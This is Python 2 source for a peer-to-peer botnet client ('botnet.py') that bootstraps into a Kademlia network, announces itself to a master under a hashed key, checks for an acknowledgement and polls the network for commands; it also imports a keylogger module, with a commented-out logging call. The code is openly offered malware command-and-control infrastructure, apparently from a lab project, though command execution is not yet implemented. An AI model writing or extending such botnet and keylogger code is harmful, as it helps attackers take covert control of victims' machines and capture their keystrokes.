import hashlib
import sys
from twisted.internet import reactor, task, defer
from twisted.python import log
#import kademlia
import time
import keylogger
from kademlia.network import Server
import os
from collections import Counter
import Crypto
from Crypto.PublicKey import RSA
from Crypto import Random
#from twisted.internet.defer import inlineCallbacks, returnValue


log.startLogging(sys.stdout)

if len(sys.argv) != 4:
	print "Usage: python botnet.py <bootstrap ip> <bootstrap port> <bot port>"
	exit(0)
bootstrap_ip = str(sys.argv[1])
port = int(sys.argv[2])
myport = int(sys.argv[3])
#application = service.Application("kademlia")
#application.setComponent(ILogObserver, log.FileLogObserver(sys.stdout, log.INFO).emit)

#object that stores private/public keypair for this node. 
class botnode:
	def __init__(self,ip,port,network_id,idhash):
		self.ip = ip
		self.port = port
		self.private = RSA.generate(1024,Random.new().read)
		self.public = self.private.publickey()
		self.id = network_id
		self.cmdkey = idhash#update(network_id).hexdigest()

def get_hash(prehash):
	m = hashlib.sha1()
	m.update(prehash)
	#m.update(port)
	#print m.hexdigest()
	return m.hexdigest()

def done(result):
    print "Key result:", result
   # reactor.stop()

def setDone(result, server):
    server.get("Loser").addCallback(done)

#helper function to get most common element in a list
def most_common(list):
	data = Counter(list)
	return data.most_common(1)[0][0]
def wait_cmd(cmd,server,bot):
	if not cmd:
		server.get(bot.cmdkey).addCallback(wait_cmd,server,bot)
	print "we have a command"
	#reactor.stop()

def ack_valid(value,server,bot):
	#t = hashlib.sha1().update('ack')
	if value!=str(bot.id):
		callhome(server,bot)
		print "no ack"
	else:
		print "we have an ack"
		wait_cmd(None,server,bot)

def check_ack(result,server,bot):
	mykey = hashlib.sha1()
	mykey.update(bot.id)
	server.get(mykey.hexdigest()).addCallback(ack_valid,server,bot)

def callhome(server,bot):
	key = hashlib.sha1()
	key.update('specialstring')
	#announce to master that we exist, then check for ack
	server.set(key.hexdigest(),str(bot.id)).addCallback(check_ack,server,bot)
	#ack = yield server.set(key.hexdigest(),str(bot.id)).addCallback(server.get(str(bot.id)))
	#once we've finished announcing, check for acknowledgement
	#ack = d.addCallback(lambda ignored: server.get(str(bot.id)))
def setup(ip_list, server):
	#check that it got a result back
	#print str(server.node.long_id)
	if not len(ip_list):
		print "Could not determine my ip, retrying"
		server.inetVisibleIP().addCallback(setup,server)
	myip = most_common(ip_list)
	idhash = get_hash(str(server.node.long_id))
	bot = botnode(myip,port,str(server.node.long_id),idhash)
	#server.set('specialstring',str(bot.id)).addCallback(callhome,server,bot)
	callhome(server,bot)
def bootstrapDone(found, server):
    if len(found) == 0:
        print "Could not connect to the bootstrap server."
        reactor.stop()
    server.inetVisibleIP().addCallback(setup,server)

#keylogger.log(done, print_keys)
server = Server()
server.listen(myport)
#bot = botnode(None,myport,server.id)
server.bootstrap([(bootstrap_ip, port)]).addCallback(bootstrapDone, server)
reactor.run()
#server.bootstrap([('192.168.56.101', 8468)]).addCallback(bootstrapDone, server)
#bootstrap is at 192.168.56.101:8468

